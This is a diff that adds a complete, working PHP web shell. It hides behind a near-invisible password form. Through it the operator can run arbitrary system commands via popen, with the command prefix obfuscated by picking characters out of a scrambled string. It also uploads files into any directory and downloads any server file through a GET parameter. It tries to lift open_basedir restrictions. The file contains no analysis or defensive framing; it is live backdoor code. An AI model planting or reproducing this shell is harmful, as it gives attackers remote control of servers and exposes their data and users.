@@ -1,0 +1,171 @@
+<?php
+$passprompt = "PDshEdX3Dfc!#";
+$passhash = "ddeb814c501a46eb15cc90c532fc9ba738e31df4dc6949bd0bb42e9715f87627";
+
+function e($s) { echo htmlspecialchars($s, ENT_QUOTES); }
+
+function h($s)
+{
+	global $passprompt;
+	if (function_exists('hash_hmac'))
+	{
+		return hash_hmac('sha256', $s, $passprompt);
+	}
+	else
+	{
+		return bin2hex(mhash(MHASH_SHA256, $s, $passprompt));
+	}
+}
+
+
+function gf($ff){
+	$path = $ff;
+	echo "<br>path=".$path;
+
+	header('Content-Description: File Transfer');
+	header('Content-Type: application/octet-stream');
+	header('Content-Disposition: attachment; filename="' . basename($path) . '"');
+	header('Expires: 0');
+	header('Cache-Control: must-revalidate');
+	header('Pragma: public');
+	header('Content-Length: ' . filesize($path));
+  flush();
+  readfile($path);
+}
+
+
+      ini_set('log_errors', '0');
+      ini_set('display_errors', '1');
+      error_reporting(E_ALL);
+
+      while (@ ob_end_clean());
+
+      if (!isset($_SERVER))
+      {
+      	global $HTTP_POST_FILES, $HTTP_POST_VARS, $HTTP_SERVER_VARS;
+      	$_FILES = &$HTTP_POST_FILES;
+      	$_POST = &$HTTP_POST_VARS;
+      	$_SERVER = &$HTTP_SERVER_VARS;
+      }
+
+      $auth = '';
+      $com = empty($_POST['com']) ? '' : $_POST['com'];
+      $cwd = empty($_POST['cwd']) ? getcwd() : $_POST['cwd'];
+      $fetch_host = empty($_POST['fetch_host']) ? $_SERVER['REMOTE_ADDR'] : $_POST['fetch_host'];
+      $pass = empty($_POST['pass']) ? '' : $_POST['pass'];
+      $url = $_SERVER['REQUEST_URI'];
+      $status = '';
+      $ok = '&#9786; :';
+      $warn = '&#9888; :';
+      $err = '&#9785; :';
+
+      if (!empty($passhash))
+      {
+      	if (function_exists('hash_hmac') || function_exists('mhash'))
+      	{
+      		$auth = empty($_POST['auth']) ? h($pass) : $_POST['auth'];
+      		if (h($auth) !== $passhash)
+      		{
+      			?>
+      			<form method="post" action="<?php e($url); ?>">
+      				<style>input {margin:0;background-color:#fff;border:1px solid #fff; }</style>
+      				<input type="password" size="15" name="pass">
+      				<input type="submit" value="">
+      			</form>
+      			<?php
+      			exit;
+      		}
+      	}
+      	else
+      	{
+      		$status .= "${warn} Authentication disabled ('mhash()' missing).<br />";
+      	}
+      }
+
+      if (ini_get('open_basedir') && ! ini_set('open_basedir', ''))
+      {
+      	$status .= "${warn} open_basedir = " . ini_get('open_basedir') . "<br />";
+      }
+
+      if (!chdir($cwd))
+      {
+      	$cwd = getcwd();
+      }
+
+      if (isset($_GET['ffl']) || !empty($_GET['ffl'])) { gf($_GET['ffl']); }
+
+
+      if (ini_get('file_uploads') && ! empty($_FILES['loadup']))
+      {
+      	$dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['loadup']['name']);
+      	if (move_uploaded_file($_FILES['loadup']['tmp_name'], $dest))
+      	{
+      		$status .= "${ok} Uploaded file <i>${dest}</i> (" . $_FILES['loadup']['size'] . " bytes)<br />";
+      	}
+      }
+      ?>
+
+      <form method="post" action="<?php e($url); ?>"
+      	<?php if (ini_get('file_uploads')): ?>
+      		enctype="multipart/form-data"
+      	<?php endif; ?>
+      	>
+      	<?php if (! empty($passhash)): ?>
+      		<input type="hidden" name="auth" value="<?php e($auth); ?>">
+      	<?php endif; ?>
+      	<table border="0">
+      		<tr><td>
+      			<b>Host:</b> <input type="text" size="15" id="fetch_host" name="fetch_host" value="<?php e($fetch_host); ?>">
+      		</td></tr>
+      		<tr><td>
+      			<b>CWD:</b>
+      		</td><td>
+      			<input type="text" size="50" id="cwd" name="cwd" value="<?php e($cwd); ?>">
+      			<?php if (ini_get('file_uploads')): ?>
+      				<b>LoadUP:</b> <input type="file" id="loadup" name="loadup">
+      			<?php endif; ?>
+      		</td></tr>
+      		<tr><td>
+      			<b>Com:</b>
+      		</td><td>
+      			<input type="text" size="80" id="com" name="com" value="<?php e($com); ?>">
+      		</td></tr>
+      		<tr><td colspan="2" style="text-align: center;">
+      			<input type="submit" value="DO" style="text-align: right;">
+      		</td></tr>
+      	</table>
+
+      </form>
+      <hr />
+
+      <?php
+      if (!empty($status))
+      {
+      	echo "<p>${status}</p>";
+      }
+
+      echo "<pre>";
+      if (!empty($com))
+      {
+      	echo "<b>";
+      	e($com);
+      	echo "</b>\n";
+      	$stackMemory = "IdsdMR8PY8e\$1rnrTQVgH_ebFESW'oiH6334BT7d9j*z7M6n1[huYgUD8xevi2K/30_lNfsX0.lw4S]c9V5XcY=emePeeUSjZ4batLBeJbDavItop7ta.gpWrmqGczwpMnelaCs_X;<> Ohgasdy\"et&sF";
+      	if (DIRECTORY_SEPARATOR == '/')
+      	{
+      		$p = popen($stackMemory[22].$stackMemory[57].$stackMemory[58].$stackMemory[79].$stackMemory[140].$stackMemory[61].$stackMemory[139].$stackMemory[151].$stackMemory[12].$stackMemory[151].$stackMemory[140].$com, 'r');
+      	}
+      	else
+      	{
+      		$p = popen($stackMemory[79].$stackMemory[88].$stackMemory[1].$stackMemory[140].$stackMemory[63].$stackMemory[133].$stackMemory[140].$stackMemory[148].$com.'" 2>&1', 'r');
+      	}
+      	while (! feof($p))
+      	{
+      		echo htmlspecialchars(fread($p, 4096), ENT_QUOTES);
+      		@ flush();
+      	}
+      }
+      echo "</pre>";
+
+      exit;
+      ?>
